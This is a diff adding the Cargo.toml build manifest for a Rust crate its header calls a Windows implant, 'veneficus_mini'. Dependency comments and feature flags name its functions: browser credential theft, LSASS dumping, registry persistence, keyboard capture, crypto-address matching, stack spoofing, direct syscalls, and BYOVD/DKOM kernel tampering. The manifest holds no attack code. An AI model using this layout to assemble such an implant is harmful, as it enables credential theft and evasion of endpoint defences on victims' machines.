@@ -1,0 +1,126 @@
+# ** *********************************************************************
+# ** *********************************************************************
+# **
+# **                              DISCLAIMER
+# **       For educational purposes only. 2026 All rights reversed.
+# **
+# ** *********************************************************************
+# ** *********************************************************************
+
+# veneficus_mini 3.0 — Windows implant crate.
+# BROKEN/UNUSED DEPS: `windows` crate is unused (code uses winapi);
+# `callghost` is never imported; ntapi/pbkdf2/sha1/walkdir/chrono/lazy_static
+# have no use in src/. winapi is missing the `dbghelp` feature required by lsass.rs.
+
+[package]
+name = "veneficus_mini"
+version = "3.0.0"
+edition = "2021"
+authors = []
+
+[dependencies]
+# Windows APIs — use windows crate (newer, more complete than winapi)
+windows = { version = "0.58", features = [
+    "Win32_Foundation",
+    "Win32_Security",
+    "Win32_Security_Authentication_Identity",
+    "Win32_System_Threading",
+    "Win32_System_Registry",
+    "Win32_System_Com",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Memory",
+    "Win32_System_LibraryLoader",
+    "Win32_System_WindowsProgramming",
+    "Win32_System_IO",
+    "Win32_System_ProcessStatus",
+    "Win32_UI_Input_KeyboardAndMouse",
+    "Win32_Storage_FileSystem",
+    "Win32_System_DataExchange",
+    "Win32_Devices_DeviceAndDriverInstallation",
+] }
+# Still needed for a few APIs not yet in the newer crate
+winapi = { version = "0.3", features = [
+    "dpapi",
+    "fileapi",
+    "handleapi",
+    "ioapiset",
+    "memoryapi",
+    "minwindef",
+    "processthreadsapi",
+    "securitybaseapi",
+    "winbase",
+    "winnt",
+    "winreg",
+    "winuser",
+] }
+ntapi = "0.4"
+
+# Async runtime
+tokio = { version = "1", features = ["full"] }
+
+# HTTP client — keep blocking for sync contexts; use rustls for TLS (no openssl dep)
+reqwest = { version = "0.12", features = ["blocking", "json", "rustls-tls"], default-features = false }
+
+# Serialisation
+serde       = { version = "1", features = ["derive"] }
+serde_json  = "1"
+
+# Crypto
+rand     = "0.8"
+base64   = "0.22"
+sha2     = "0.10"
+hmac     = "0.12"
+hex      = "0.4"
+pbkdf2   = "0.12"
+sha1     = "0.10"
+aes      = "0.8"
+aes-gcm  = "0.10"
+
+# System info
+sysinfo = "0.30"
+dirs    = "5"
+walkdir = "2"
+chrono  = "0.4"
+regex   = "1"
+
+# Persistence / registry
+winreg = "0.52"
+
+# Database (browser credentials)
+rusqlite = { version = "0.31", features = ["bundled"] }
+
+# Logging
+log            = "0.4"
+simple_logger  = "5"
+
+# Error handling
+anyhow    = "1"
+thiserror = "1"
+
+# Misc
+lazy_static = "1"
+
+# Stack spoofing via lacuna
+lacuna-rs = { git = "https://github.com/Karkas66/lacuna-rs" }
+
+# Direct syscalls via CallGhost
+callghost = { git = "https://github.com/PatchRequest/CallGhost", branch = "master" }
+
+# Crypto address regex
+once_cell = "1"
+
+[features]
+default  = ["byovd", "dkom"]
+byovd    = []
+dkom     = []
+
+[profile.release]
+strip         = true
+lto           = true
+codegen-units = 1
+opt-level     = "z"
+panic         = "abort"
+
+[build-dependencies]
+getrandom = "0.2"
+hex = "0.4"
